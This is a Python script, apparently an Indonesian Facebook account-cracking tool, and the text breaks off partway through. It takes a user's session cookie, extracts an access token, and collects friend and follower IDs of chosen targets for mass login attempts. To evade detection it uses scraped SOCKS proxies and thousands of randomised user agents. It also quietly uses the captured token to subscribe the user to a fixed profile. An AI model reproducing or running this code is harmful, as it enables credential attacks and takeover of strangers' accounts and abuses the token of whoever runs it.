#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
try:
        import rich
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
	os.system('pip install requests && pip install mechanize ')
#------------------[ USER-AGENT ]-------------------#
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
	
	
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['4.1.2','5.1.1','6.0.1','7.1.1','8.0.1','9.0.1'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['4.1.2','5.1.1','6.1.1','7.1.1','8.1.0'])
	c='Aquaris V Plus'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11'])
	c='ELE-L29'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['4.1','5.1','6.0','7.0','8.0','9.0'])
	c='Moto C'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='(KHTML, like Gecko) Chrome/84.0.4147.111'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['4.1.2','5.1.1','6.0.1','7.1.1','8.0.1','9.0.1'])
	c='Nokia_X Build/JZO54K)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.94'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 NokiaBrowser/1.0.1.54'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
	
def user_agentAPI():
	ugent =[
	    "Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3396.81 Mobile Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12",
	    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)",
        "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
        "NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)",
        "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2",
        "Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 5.1.1; Navori QL Stix 3500 Build/LMY49F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 7.0; SM-G930F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]",
        "Mozilla/5.0 (Linux; Android 7.0; MHA-L29 Build/HUAWEIMHA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]",
       "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/FBIOS;FBAV/96.0.0.45.70;FBBV/60548545;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/E-Plus;FBID/phone;FBLC/de_DE;FBOP/5;FBRV/0]",
       "Mozilla/5.0 (Linux; Android 4.4.4; G7-L01 Build/HuaweiG7-L01) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/121.0.0.15.70;]",
       "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
       "Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]",
       "[FBAN/FB4A,FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI,.FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19.FBCA/armeabi-v7a:armeabi,]"]
	rand_ua = random.choice(ugent)
	return rand_ua
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def jalan(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
def clear():
	os.system('clear')
def back():
	login()
	
	#------------------[ MACHINE-SUPPORT ]---------------#
def sora(u):
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	print(f'''\t{M}
	
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡸⠁⠘⢉⣷⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠁⠀⠀⢀⡇⣇⡰⠲⣆⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠁⠀⠀⢰⣾⡦⣾⠁⠀⢸⡆⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⢴⠞⠁⠀⠀⠀⠘⡆⣀⣿⠀⠀⡼⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠞⡱⣶⡾⠀⠀⠀⠀⠀⠀⣿⠋⠀⠀⢰⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⢸⡧⠏⠀⠀⠀⠀⠀⠀⠀⠁⠀⣀⡴⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣴⠃⠀⢸⣿⣾⠀⠀⠀⠀⠀⠀⣜⣀⣾⠿⣷⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣸⡿⠀⢠⣄⠸⢹⣷⠀⠀⢆⠀⠀⣏⡿⠉⠀⠈⢹⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⠟⠀⣤⠀⣿⠃⠞⢹⣶⣰⣼⠀⠀⠉⠀⠀⠀⠀⠈⢧⠀⠀⠀⠀
⠀⠀⠀⣀⡾⠧⢴⣾⣿⢠⠏⠀⠀⠘⢹⡿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀
⠐⠺⢿⣿⣧⣠⣴⣿⣥⣿⡄⠀⠀⠀⠀⠳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀⠀
⠀⠀⠀⠀⣽⣿⡍⠙⠛⢻⣀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⣀⢰⣿⡀⠀
⠀⠀⠀⣸⠟⣿⣰⠃⠀⠈⣿⢷⠀⣀⠀⠀⠀⠀⠐⣦⡀⢸⣧⠀⢸⣿⣼⡟⡇⠀
⠀⠀⠀⠋⣼⣿⣿⢀⡄⠀⠈⠈⢧⣼⣦⡸⣄⠀⠀⣼⢷⡞⠙⢷⣾⣿⠹⣿⡁⠀
⠀⠀⠀⢸⣿⣿⣿⡿⠀⠀⠀⠀⠀⠛⠌⠳⣿⢷⣤⡇⠈⠀⠀⠀⠙⢿⣆⠈⠻⡄
⠀⠀⠀⠀⢹⢁⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⢧⡀⠀⠀⠀⠀⠀⢹⠙⣷⣧
⠀⠀⠀⠀⠘⠸⠿⠦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢀⣿⠛
	
  
 {P}Author :{H} Aldytraa   WA :085361724434                                        ''')   

#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t× Saran Ektensi : [green]Cookiedough[white] ×'))
		asu = random.choice([m,k,h,b,u])
		cookie=input(f'  [{h}•{x}] Masukan Cookies :{asu} ')
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1));bot()
		cok=open(".cok.txt", "w").write(cookie)
		print(f'  {x}[{h}•{x}]{h} Log in succes silahkan ketik lagi perintah nya 🤙{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s Log in failed silahkan cek akun tumbal 🤙%s'%(x,k,x,m,x))
		exit()
def bot():
	try:
		requests.post("https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s"%(tokenku))
	except:
		pass
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	bo = random.choice([m,k,h,b,u,p])
	
	io = '''[bold cyan][01] PUBLIC PUBLIK\n[02] EXIT[bold cyan]'''
	oi = nel(io, style='cyan')
	cetak(nel(oi, title='[bold cyan] • MENU CRACK • [/bold cyan]'))
	_____alvino__adijaya_____ = input('\n Pilih : ')
	if _____alvino__adijaya_____ in ['1']:
		dump_massal()
	elif _____alvino__adijaya_____ in ['2']:
		dump_follower()
	elif _____alvino__adijaya_____ in ['3']:
		grup()
	elif _____alvino__adijaya_____ in ['4']:
		crack_file()
	elif _____alvino__adijaya_____ in ['5']:
		result()
	elif _____alvino__adijaya_____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('>> succes log out ')
		exit()
	else:
		print('>> Pilih Yang Bener Asuu ')
		back()
def error():
	print(f'{k}>> Maaf Fitur Ini Masih Di Perbaiki {x}')
	time.sleep(4)
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print(f'>> 1. Hasil {h}OK{x} Anda ')
	print(f'>> 2. Hasil {k}CP{x} Anda ')
	print('>> 3. Kembali	')
	kz = input(f'\n>> Pilih : ')
	if kz in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('>> File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('>> Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'>> %s. %s ({k} %s {x}Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n>> Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x}>> {k}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'{x}[{m} Klik Enter{x} ]')
			back()
	elif kz in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('>> File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('>> Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'>> %s. %s ( {h}%s{x} Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'>> %s. %s ({h} %s {x}Idz )'%(cih,isi,(len(hem))))
			geeh = input(f'\nPilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}>> {h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			print('')
			input(f'{x}[{m} Klik Enter{x} ]')
			back()
	elif kz in ['3']:
		back()
	else:
		print('>> Pilih Yang Bener Kontol ')
		back()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input('MAU BERAPA DOSA? : '))
	except ValueError:
		print(' Masukkan Angka, Malah Huruff ')
		exit()
	if jum<1 or jum>100:
		print('>> Gagal Dump ID ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('Masukkan ID Yang Ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('>> Sinyal Loh Kek Kontoll ')
			exit()
	try:
		print('')
		print(f'>> IDYang Terkumpul{h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('>> Sinyal kek Kontol ')
		back()
	except (KeyError,IOError):
		print(f'>>{k} Pertemanan Tidak Public {x}')
		time.sleep(3)
		back()
#-------------------[ CRACK-PENGIKUT ]----------------#
def dump_pengikut():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	print('>> Ketik ( me ) Jika Ingin Crack Follower Sendiri ')
	pil = input('>> Masukkan Idz Target : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
		for pi in koh2['subscribers']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(f'>> Total Idz :{h} '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print('>> Koneksi Internet Bermasalah ')
		exit()
	except (KeyError,IOError):
		print('>> Gagal Mengambil Target ')
		exit()
#------------------[ CRACK-GRUP ]-----------------#
balmond = b+"["+h+"✓"+b+"]"

def lah():
	print(f'\n{x}>> Total Idz Yang Terkumpul :{h} %s '%(len(id)))
	input(f'{x}>> [ {m}Klik Enter {x}] ')
	print('')
	pass
	setting()
def grup():
	print('')
	id = input(f'{x}>> Masukkan Username Atau Idz Grup : ')
	ua = 'Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16','Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba','Mozilla/5.0 (Linux; Android 8.0.0; SM-J810G Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; TA-1032 Build/O00623) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.70 Mobile Safari/537.36','Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20190227 Firefox/35.0','Mozilla/5.0 (Windows CE) AppleWebKit/5351 (KHTML, like Gecko) Chrome/38.0.886.0 Mobile Safari/5351','Mozilla/5.0 (Windows NT 5.2; en-US; rv:1.9.0.20) Gecko/20110321 Firefox/37.0','Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_1 like Mac OS X; sl-SI) AppleWebKit/532.22.4 (KHTML, like Gecko) Version/3.0.5 Mobile/8B118 Safari/6532.22.4','Opera/9.90 